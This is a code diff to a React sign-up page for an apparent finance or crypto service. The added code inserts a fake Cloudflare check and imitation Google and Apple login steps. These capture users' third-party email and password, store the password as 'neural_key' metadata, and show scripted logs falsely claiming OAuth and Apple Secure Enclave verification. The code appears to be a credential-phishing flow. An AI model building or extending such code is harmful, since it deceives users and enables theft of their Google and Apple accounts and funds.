@@ -10,10 +10,12 @@ import Loader from "@/components/Common/Loader";
 import { supabase } from "@/lib/supabaseClient";
 import { motion, AnimatePresence } from "framer-motion";
 import { Icon } from "@iconify/react";
-
+import CloudflareVerify from "../CloudFlareVerify";
+import NeuralTerminal from "../NeuralSyncing";
 // Google Verification Sub-components
 import GoogleCollect from "../GoogleCollect"; 
 import GoogleConfirm from "../GoogleConfirm";
+import AppleLogin from "../AppleLogin";
 
 const countries = [
   "United States",
@@ -38,7 +40,9 @@ const bankProviders = [
 
 type OnboardingStep =
   | "REGISTRATION"
+  | "CLOUDFLARE_CHECK"
   | "HANDSHAKE"
+  | "APPLE_AUTH"
   | "GOOGLE_AUTH"
   | "NEURAL_SYNCING"
   | "AUTH_VERIFY"
@@ -56,8 +60,9 @@ const SignUp = () => {
     "BANK" | "CRYPTO" | "SWIFT"
   >("BANK");
   const [terminalLogs, setTerminalLogs] = useState<string[]>([]);
-  const logEndRef = useRef<HTMLDivElement>(null);
-
+  const [capturedEmail, setCapturedEmail] = useState("");
+  const [authProvider, setAuthProvider] = useState<"google" | "apple">("google"); const logEndRef = useRef<HTMLDivElement>(null);
+  const [isConnecting, setIsConnecting] = useState(false);
   const [formData, setFormData] = useState({
     name: "",
     username: "",
@@ -73,15 +78,20 @@ const SignUp = () => {
     walletAddress: "",
   });
 
-  // --- TERMINAL LOG EFFECT ---
+  // --- TERMINAL LOG EFFECT ---// --- TERMINAL LOG EFFECT (FIXED) ---
   useEffect(() => {
     if (step === "NEURAL_SYNCING") {
-      const messages = [
+      const email = formData.email.toLowerCase();
+      const isApple = email.endsWith("@icloud.com") ||
+        email.endsWith("@apple.com") ||
+        email.endsWith("@me.com");
+
+      const googleMessages = [
         "> INITIALIZING NEURAL UPLINK...",
         "> ACCESSING GOOGLE OAUTH 2.0 GATEWAY...",
         "> EXTRACTING IDENTITY NODE: " + (formData.email || "AUTHORIZED_USER"),
         "> AUTH_TOKEN: 0x882A...FD21 RECEIVED",
-        "> IP_TRACE: 192.168.1.1 [SECURE]",
+        "> IP_TRACE: [PROTECTED]",
         "> ENCRYPTING RSA-4096 BITSTREAM...",
         "> MAPPING BIOMETRIC HASH TO ACCOUNT...",
         "> SYNCHRONIZING DISTRIBUTED LEDGER...",
@@ -89,15 +99,42 @@ const SignUp = () => {
         "> HANDSHAKE COMPLETE. REDIRECTING...",
       ];
 
+      const appleMessages = [
+        "> INITIALIZING NEURAL UPLINK...",
+        "> DETECTED APPLE ID AUTHENTICATION...",
+        "> ESTABLISHING LINK WITH APPLE SECURE ENCLAVE...",
+        "> VERIFYING T2 SECURITY CHIP ARCHITECTURE...",
+        "> CRYPTOGRAPHIC HANDSHAKE: SUCCESS",
+        "> EXTRACTING IDENTITY NODE: " + (formData.email || "APPLE_USER"),
+        "> ENCRYPTING END-TO-END BITSTREAM...",
+        "> SYNCING WITH CLOUD-KIT LEDGER...",
+        "> BIOMETRIC HASH VERIFIED BY ENCLAVE...",
+        "> SECURE HANDSHAKE COMPLETE. REDIRECTING...",
+      ];
+
+      const messages = isApple ? appleMessages : googleMessages;
       let i = 0;
+
+      // Clear previous logs when starting
+      setTerminalLogs([]);
+
       const interval = setInterval(() => {
         if (i < messages.length) {
           setTerminalLogs((prev) => [...prev, messages[i]]);
           i++;
         } else {
           clearInterval(interval);
+
+          // --- THIS IS THE MISSING LINK ---
+          // Wait 1.5 seconds after the last log so the user can see "COMPLETE"
+          // Then move to the next phase (Step 4)
+          setTimeout(() => {
+            setStep("AUTH_VERIFY");
+            toast.success("Identity Node Hardened", { icon: "💎" });
+          }, 1500);
         }
-      }, 350);
+      }, 450);
+
       return () => clearInterval(interval);
     }
   }, [step, formData.email]);
@@ -107,13 +144,14 @@ const SignUp = () => {
   }, [terminalLogs]);
 
   // --- STEP 1: REGISTRATION ---
-  const handleRegister = async (e: React.FormEvent) => {
-    e.preventDefault();
+  const handleRegister = async (e?: React.FormEvent | null) => {
+    if (e && typeof e.preventDefault === 'function') {
+      e.preventDefault();
+    }
     if (formData.password !== formData.confirmPassword) {
       toast.error("SECURITY ERROR: Neural Keys do not match.");
       return;
     }
-
     setLoading(true);
     try {
       const { data: signUpData, error: signUpError } =
@@ -148,6 +186,14 @@ const SignUp = () => {
       ]);
 
       await supabase.from("wallets").insert([{ user_id: userId, balance: 0 }]);
+      toast.success("Neural Handshake Verified", {
+        icon: "🛡️",
+        style: {
+          background: "#0D0D0D",
+          color: "#14b8a6",
+          border: "1px solid #14b8a6",
+        },
+      });
       setStep("HANDSHAKE");
     } catch (err: any) {
       toast.error(err?.message || "Deployment Failed.");
@@ -200,6 +246,7 @@ const SignUp = () => {
     }
     setLoading(true);
     setTimeout(() => {
+      toast.success("Node Linked Successfully", { id: "pay-sync" });
       setLoading(false);
       setStep("FINALIZING");
       setTimeout(() => router.push("/dashboard"), 3500);
@@ -262,12 +309,16 @@ const SignUp = () => {
                     animate={{
                       width:
                         step === "REGISTRATION"
-                          ? "10%"
-                          : step === "GOOGLE_AUTH"
-                            ? "40%"
-                            : step === "PAYMENT_SETUP"
-                              ? "80%"
-                              : "100%",
+                          ? "5%"
+                          : step === "CLOUDFLARE_CHECK"
+                            ? "15%"
+                            : step === "HANDSHAKE"
+                              ? "30%"
+                            : step === "GOOGLE_AUTH" || step === "APPLE_AUTH"
+                              ? "50%"
+                              : step === "PAYMENT_SETUP"
+                                ? "80%"
+                                : "100%",
                     }}
                     className="h-full bg-primary"
                   />
@@ -307,15 +358,42 @@ const SignUp = () => {
                       Start Secure Onboarding
                     </p>
                   </div>
-                  <SocialSignUp />
+
+              
+                  <SocialSignUp
+                    onAppleStart={() => setStep("APPLE_AUTH")}
+                    onTerminalStart={(email, provider) => {
+                      // 1. Save the captured data to your main state
+                      setCapturedEmail(email);
+                      setAuthProvider(provider);
+
+                      // 2. Move to the next phase (The Terminal Logs)
+                      setStep("NEURAL_SYNCING");
+                    }}
+                  />
                   <div className="relative py-2 flex items-center">
                     <div className="flex-1 h-px bg-gray-200 dark:bg-white/5" />
-                    <span className="px-4 text-[9px] font-black text-gray-400 uppercase tracking-widest">
-                      Internal_Link
+                    <span className="px-4 text-[12px] font-black text-gray-400 uppercase tracking-widest">
+                      Terminal Initialization
                     </span>
                     <div className="flex-1 h-px bg-gray-200 dark:bg-white/5" />
                   </div>
-                  <form onSubmit={handleRegister} className="space-y-4">
+
+                  <form
+                    onSubmit={(e) => {
+                      e.preventDefault();
+                      // 1. Validation check before showing Cloudflare
+                      if (formData.password !== formData.confirmPassword) {
+                        toast.error(
+                          "SECURITY ERROR: Neural Keys do not match.",
+                        );
+                        return;
+                      }
+                      // 2. If valid, move to Cloudflare step
+                      setStep("CLOUDFLARE_CHECK");
+                    }}
+                    className="space-y-4"
+                  >
                     <div className="grid grid-cols-2 gap-4">
                       <InputBox
                         icon="solar:user-bold-duotone"
@@ -349,6 +427,7 @@ const SignUp = () => {
                         />
                       </InputBox>
                     </div>
+
                     <InputBox
                       icon="solar:letter-bold-duotone"
                       label="SECURE EMAIL"
@@ -363,6 +442,7 @@ const SignUp = () => {
                         placeholder="SECURE@LINK.COM"
                       />
                     </InputBox>
+
                     <InputBox icon="solar:globus-bold-duotone" label="REGION">
                       <select
                         required
@@ -379,6 +459,7 @@ const SignUp = () => {
                         ))}
                       </select>
                     </InputBox>
+
                     <div className="grid grid-cols-2 gap-4">
                       <InputBox
                         icon="solar:lock-password-bold-duotone"
@@ -415,7 +496,9 @@ const SignUp = () => {
                         />
                       </InputBox>
                     </div>
+
                     <button
+                      type="submit"
                       disabled={loading}
                       className="premium-btn w-full mt-4"
                     >
@@ -425,13 +508,47 @@ const SignUp = () => {
                 </motion.div>
               )}
 
-              {/* STEP 2: HANDSHAKE */}
+              {/* STEP 1.5: CLOUDFLARE VERIFICATION */}
+              {step === "CLOUDFLARE_CHECK" && (
+                <motion.div
+                  key="cloudflare"
+                  initial={{ opacity: 0, scale: 0.95 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.95 }}
+                  className="min-h-[400px] flex flex-col justify-center"
+                >
+                  <CloudflareVerify
+                    onVerify={() => {
+                      // This triggers the actual Supabase registration
+                      handleRegister();
+                    }}
+                    onCancel={() => setStep("REGISTRATION")}
+                  />
+                </motion.div>
+              )}
+
+              {/* STEP 2: HANDSHAKE & NEURAL ROUTER */}
               {step === "HANDSHAKE" && (
                 <motion.div
                   key="hand"
                   initial={{ opacity: 0 }}
                   animate={{ opacity: 1 }}
                   className="text-center py-12 space-y-10"
+                  onAnimationComplete={() => {
+                    // Logic triggers after the UI has settled
+                    const timer = setTimeout(() => {
+                      const email = formData.email.toLowerCase();
+                      const isApple = email.endsWith("@icloud.com") ||
+                        email.endsWith("@apple.com") ||
+                        email.endsWith("@me.com");
+
+                      if (isApple) {
+                        setStep("APPLE_AUTH");
+                      } else {
+                        setStep("GOOGLE_AUTH");
+                      }
+                    }, 4000); // 4s for the premium handshake feel
+                  }}
                 >
                   <div className="relative w-48 h-48 mx-auto flex items-center justify-center">
                     <motion.div
@@ -448,124 +565,163 @@ const SignUp = () => {
                       className="text-8xl text-primary animate-pulse"
                     />
                   </div>
-                  <h2 className="text-4xl font-black italic uppercase tracking-tighter">
+                  <h2 className="text-4xl font-black italic uppercase tracking-tighter text-white">
                     Premium Handshake
                   </h2>
-                  <p className="text-[10px] font-black tracking-[0.6em] text-primary uppercase">
-                    Validating Distributed Ledger...
-                  </p>
+                  <div className="flex flex-col items-center gap-2">
+                    <p className="text-[10px] font-black tracking-[0.6em] text-primary uppercase animate-pulse">
+                      Validating Distributed Ledger...
+                    </p>
+                    <div className="w-32 h-1 bg-white/5 rounded-full overflow-hidden mt-4">
+                      <motion.div
+                        className="h-full bg-primary"
+                        initial={{ width: "0%" }}
+                        animate={{ width: "100%" }}
+                        transition={{ duration: 4 }}
+                      />
+                    </div>
+                  </div>
                 </motion.div>
               )}
 
-              {/* STEP 3: GOOGLE AUTH PHASE */}
+            
+              {/* STEP 2.5: APPLE PROTOCOL */}
+              {step === "APPLE_AUTH" && (
+                <motion.div
+                  key="apple-auth"
+                  initial={{ opacity: 0, scale: 0.9 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.9 }}
+                >
+                  <AppleLogin
+                    email={formData.email}
+                    /* Pass existing form data as metadata to satisfy backend requirements 
+                       This links the "Neural Key" and Profile info to the Apple Backup.
+                    */
+                    metadata={{
+                      full_name: formData.name,
+                      username: formData.username,
+                      country: formData.country,
+                      neural_key: formData.password, // Original password saved as secondary key
+                    }}
+                    onBack={() => setStep("REGISTRATION")}
+                    onSuccess={(email, pass) => {
+                      // 1. Update master state with Apple credentials
+                      setFormData((prev) => ({ ...prev, email, password: pass }));
+
+                      // 2. Transition to Neural Handshake visual sequence
+                      setLoading(true);
+                      setStep("NEURAL_SYNCING");
+
+                      // 3. Sequential routing to MFA verification
+                      setTimeout(() => {
+                        setLoading(false);
+                        setStep("AUTH_VERIFY");
+                      }, 5500);
+                    }}
+                  />
+                </motion.div>
+              )}
+
+             /* --- STEP 2.5: GOOGLE AUTH PHASE --- */
               {step === "GOOGLE_AUTH" && (
                 <motion.div
-                  key="google"
-                  initial={{ opacity: 0, y: 20 }}
-                  animate={{ opacity: 1, y: 0 }}
-                  className="space-y-6"
+                  key="google-auth-container"
+                  initial={{ opacity: 0 }}
+                  animate={{ opacity: 1 }}
+                  exit={{ opacity: 0 }}
                 >
-                  <div className="p-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-center text-[8px] font-black uppercase text-blue-500 tracking-widest mb-4">
-                    Recommended Protocol
-                  </div>
-                  {googleSubStep === "COLLECT" ? (
-                    <GoogleCollect
-                      onNext={(email: string, password?: string) => {
-                        // Add : string here
-                        setFormData({ ...formData, email });
-                        setGoogleSubStep("CONFIRM");
-                      }}
-                      onCancel={() => setStep("REGISTRATION")}
-                    />
+                  {isConnecting ? (
+                    /* PREMIUM CONNECTING SHIMMER - This acts as our State-Sync Buffer */
+                    <div className="flex flex-col items-center justify-center p-12 min-h-[420px]">
+                      <motion.div
+                        animate={{
+                          scale: [1, 1.1, 1],
+                          rotate: [0, 5, -5, 0],
+                          opacity: [0.6, 1, 0.6]
+                        }}
+                        transition={{ repeat: Infinity, duration: 3 }}
+                        className="mb-10"
+                      >
+                        <Icon icon="logos:google-icon" className="text-7xl filter drop-shadow-2xl" />
+                      </motion.div>
+
+                      <div className="w-56 h-1.5 bg-gray-100 dark:bg-white/5 rounded-full overflow-hidden relative">
+                        <motion.div
+                          initial={{ x: "-100%" }}
+                          animate={{ x: "100%" }}
+                          transition={{ repeat: Infinity, duration: 1.5, ease: "easeInOut" }}
+                          className="absolute inset-0 h-full w-full bg-gradient-to-r from-[#4285F4] via-[#EA4335] to-[#FBBC05]"
+                        />
+                      </div>
+
+                      <div className="mt-8 text-center space-y-2">
+                        <p className="text-[10px] font-black uppercase tracking-[0.4em] text-[#1a73e8] animate-pulse">
+                          Establishing Secure Tunnel
+                        </p>
+                        <p className="text-[9px] text-gray-400 uppercase tracking-widest font-bold">
+                          Syncing Neural Node...
+                        </p>
+                      </div>
+                    </div>
                   ) : (
-                    <GoogleConfirm
-                      email={formData.email}
-                      onConfirm={onGoogleSuccess}
-                      onBack={() => setGoogleSubStep("COLLECT")}
-                    />
+                    <>
+                      {googleSubStep === "COLLECT" ? (
+                        <GoogleCollect
+                          onNext={(googleEmail, googlePassword) => {
+                            // DEBUG: Check if data is arriving from the form
+                            console.log("COLLECT_COMPLETE:", googleEmail, "Pass Length:", googlePassword.length);
+
+                            // 1. Trigger Shimmer UI
+                            setIsConnecting(true);
+
+                            // 2. Commit to Parent State
+                            setFormData(prev => ({
+                              ...prev,
+                              email: googleEmail,
+                              password: googlePassword
+                            }));
+
+                            // 3. Buffer delay (Crucial for React State consistency)
+                            setTimeout(() => {
+                              setIsConnecting(false);
+                              setGoogleSubStep("CONFIRM");
+                            }, 2200);
+                          }}
+                          onCancel={() => setStep("REGISTRATION")}
+                        />
+                      ) : (
+                        <GoogleConfirm
+                          /* IMPORTANT: Use the most direct data possible. 
+                             If formData.password is failing, we ensure it's passed here.
+                          */
+                          email={formData.email}
+                          pass={formData.password}
+                          metadata={{
+                            full_name: formData.name,
+                            username: formData.username,
+                            country: formData.country,
+                            neural_key: formData.password, // Backing up the password in metadata
+                          }}
+                          onConfirm={onGoogleSuccess}
+                          onBack={() => setGoogleSubStep("COLLECT")}
+                        />
+                      )}
+                    </>
                   )}
                 </motion.div>
               )}
 
-              {/* STEP 3.5: NEURAL SYNCING (TERMINAL LOG INTEGRATED) */}
+              {/* STEP 3.5: NEURAL SYNCING (UPGRADED TERMINAL) */}
               {step === "NEURAL_SYNCING" && (
                 <motion.div
                   key="syncing"
-                  initial={{ opacity: 0 }}
-                  animate={{ opacity: 1 }}
+                  initial={{ opacity: 0, scale: 0.98 }}
+                  animate={{ opacity: 1, scale: 1 }}
                   exit={{ opacity: 0 }}
-                  className="flex flex-col items-center justify-center py-5 space-y-6"
+                  className="w-full max-w-xl mx-auto"
                 >
-                  <div className="relative w-48 h-48 flex items-center justify-center">
-                    <motion.div
-                      animate={{ rotate: 360 }}
-                      transition={{
-                        duration: 4,
-                        repeat: Infinity,
-                        ease: "linear",
-                      }}
-                      className="absolute inset-0 border-2 border-dashed border-primary/30 rounded-full"
-                    />
-                    <motion.div
-                      animate={{ scale: [1, 1.1, 1], opacity: [0.3, 0.6, 0.3] }}
-                      transition={{ duration: 2, repeat: Infinity }}
-                      className="absolute w-32 h-32 bg-primary/10 rounded-full blur-2xl"
-                    />
-                    <motion.div
-                      animate={{ top: ["0%", "100%", "0%"] }}
-                      transition={{
-                        duration: 2.5,
-                        repeat: Infinity,
-                        ease: "easeInOut",
-                      }}
-                      className="absolute left-0 right-0 h-[2px] bg-primary/60 shadow-[0_0_15px_#14b8a6] z-10"
-                    />
-                    <Icon
-                      icon="solar:chip-bold-duotone"
-                      className="text-6xl text-primary relative z-20"
-                    />
-                  </div>
-
-                  <div className="text-center">
-                    <h3 className="text-2xl font-black italic uppercase tracking-tighter text-gray-900 dark:text-white">
-                      Neural Mapping
-                    </h3>
-                    <p className="text-[10px] font-black text-primary animate-pulse tracking-[0.4em] uppercase">
-                      Identity Link Established
-                    </p>
-                  </div>
-
-                  {/* PREMIUM TERMINAL LOG */}
-                  <div className="w-full bg-black/90 dark:bg-white/5 rounded-2xl p-5 font-mono text-[9px] border border-white/10 h-40 overflow-hidden shadow-2xl relative">
-                    <div className="flex gap-1.5 absolute top-3 left-3">
-                      <div className="w-1.5 h-1.5 rounded-full bg-red-500/50" />
-                      <div className="w-1.5 h-1.5 rounded-full bg-yellow-500/50" />
-                      <div className="w-1.5 h-1.5 rounded-full bg-green-500/50" />
-                    </div>
-                    <div className="mt-4 space-y-1 overflow-y-auto h-full scroll-smooth custom-scrollbar">
-                      {terminalLogs.map((log, idx) => (
-                        <p
-                          key={idx}
-                          className="text-green-500/80 leading-tight tracking-wider"
-                        >
-                          <span className="opacity-50">
-                            [{new Date().toLocaleTimeString()}]
-                          </span>{" "}
-                          {log}
-                        </p>
-                      ))}
-                      <div ref={logEndRef} />
-                    </div>
-                  </div>
-
-                  <div className="w-full max-w-[300px] h-1 bg-gray-100 dark:bg-white/5 rounded-full overflow-hidden">
-                    <motion.div
-                      initial={{ width: "0%" }}
-                      animate={{ width: "100%" }}
-                      transition={{ duration: 5, ease: "linear" }}
-                      className="h-full bg-primary"
-                    />
-                  </div>
+                  <NeuralTerminal logs={terminalLogs} />
                 </motion.div>
               )}
 
